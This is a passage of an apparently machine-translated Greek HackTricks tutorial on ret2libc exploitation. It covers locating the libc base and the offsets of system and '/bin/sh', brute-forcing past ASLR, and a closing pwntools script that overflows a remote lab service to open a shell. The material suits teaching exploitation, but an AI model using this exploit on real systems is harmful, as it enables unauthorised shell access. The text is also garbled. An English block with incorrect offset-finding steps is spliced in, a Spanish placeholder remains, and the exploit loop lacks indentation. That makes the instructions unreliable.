<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


**Εάν έχετε βρει ένα ευπάθεια δυαδικού αρχείου και πιστεύετε ότι μπορείτε να το εκμεταλλευτείτε χρησιμοποιώντας το Ret2Lib, εδώ μπορείτε να βρείτε μερικά βασικά βήματα που μπορείτε να ακολουθήσετε.**

# Εάν είστε **μέσα** στο **σύστημα φιλοξενίας**

## Μπορείτε να βρείτε τη **διεύθυνση της βιβλιοθήκης**c
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Αν θέλετε να ελέγξετε αν το ASLR αλλάζει τη διεύθυνση της libc, μπορείτε να κάνετε:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Λήψη της μετατόπισης της συνάρτησης system

To get the offset of the system function, we can use the following steps:

1. Create a simple program that calls the system function with a dummy command.
2. Compile the program with debugging symbols enabled.
3. Use a debugger, such as GDB, to analyze the program and find the offset of the system function.

Here is an example program in C:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("echo Hello, World!");
    return 0;
}
```

To compile the program with debugging symbols, use the `-g` flag:

```bash
gcc -g program.c -o program
```

Next, run the program in GDB:

```bash
gdb program
```

Once inside GDB, set a breakpoint at the system function:

```bash
break system
```

Run the program:

```bash
run
```

When the breakpoint is hit, use the `info functions` command to list all the functions and their addresses. Look for the address of the system function:

```bash
info functions
```

The offset of the system function can be calculated by subtracting the base address of the library where the function resides from the address of the function itself.

Note: The offset may vary depending on the system and library versions.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
## Αποκτήστε τη μετατόπιση του "/bin/sh"

Για να αποκτήσετε τη μετατόπιση του αλφαριθμητικού "/bin/sh" στην μνήμη, μπορείτε να χρησιμοποιήσετε το εργαλείο `objdump`. Ακολουθήστε τα παρακάτω βήματα:

1. Εκτελέστε την εντολή `objdump -s -j .rodata <binary>` για να εμφανιστούν οι πληροφορίες της ενότητας `.rodata` του εκτελέσιμου αρχείου.
2. Αναζητήστε τη γραμμή που περιέχει το αλφαριθμητικό "/bin/sh".
3. Η μετατόπιση του αλφαριθμητικού "/bin/sh" θα είναι ο αριθμός που ακολουθεί την αντίστοιχη γραμμή.

Παρακάτω παρουσιάζεται ένα παράδειγμα εντολής:

```bash
objdump -s -j .rodata /path/to/binary | grep "/bin/sh"
```

Η έξοδος θα περιέχει τη μετατόπιση του αλφαριθμητικού "/bin/sh" στη μνήμη.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

Εάν η διεργασία δημιουργεί **παιδιά** κάθε φορά που επικοινωνείτε μαζί της (διακομιστής δικτύου), προσπαθήστε να **διαβάσετε** αυτό το αρχείο (πιθανώς θα χρειαστείτε να είστε ρουτ).

Εδώ μπορείτε να βρείτε **ακριβώς πού φορτώνεται η βιβλιοθήκη libc** μέσα στη διεργασία και **πού θα φορτωθεί** για κάθε παιδί της διεργασίας.

![](<../../.gitbook/assets/image (95).png>)

Σε αυτήν την περίπτωση φορτώνεται στη διεύθυνση **0xb75dc000** (Αυτή θα είναι η βασική διεύθυνση της libc)

## Χρήση του gdb-peda

Αποκτήστε τη διεύθυνση της συνάρτησης **system**, της συνάρτησης **exit** και του αλφαριθμητικού **"/bin/sh"** χρησιμοποιώντας το gdb-peda:
```
p system
p exit
find "/bin/sh"
```
# Παράκαμψη του ASLR

Μπορείτε να προσπαθήσετε να κάνετε bruteforce τη διεύθυνση βάσης της βιβλιοθήκης libc.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Κώδικας
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
